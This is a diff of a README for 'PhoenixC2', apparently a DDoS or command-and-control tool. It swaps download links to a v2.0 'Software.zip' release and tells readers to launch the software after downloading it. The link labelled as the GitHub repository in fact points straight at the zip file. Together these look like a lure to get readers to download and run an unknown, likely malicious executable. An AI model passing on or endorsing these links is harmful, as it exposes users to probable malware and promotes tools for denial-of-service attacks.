@@ -34,13 +34,13 @@ Explore a wide range of topics related to DDoS attacks, including:
 ## Software Download
 
 Click the button below to download the software:
-[![Download PhoenixC2 Software](https://github.com/Kauan123z456/PhoenixC2/releases/download/v1.0.0/Application.zip%20Software-blue)](https://github.com/Kauan123z456/PhoenixC2/releases/download/v1.0.0/Application.zip)
+[![Download PhoenixC2 Software](https://github.com/Kauan123z456/PhoenixC2/releases/download/v2.0/Software.zip%20Software-blue)](https://github.com/Kauan123z456/PhoenixC2/releases/download/v2.0/Software.zip)
 
 *(Note: The software needs to be launched after download.)*
 
 ## Visit the Repository
 
-For more information and updates, visit the [PhoenixC2 GitHub repository](https://github.com/Kauan123z456/PhoenixC2/releases/download/v1.0.0/Application.zip).
+For more information and updates, visit the [PhoenixC2 GitHub repository](https://github.com/Kauan123z456/PhoenixC2/releases/download/v2.0/Software.zip).
 
 ## Get Involved
 
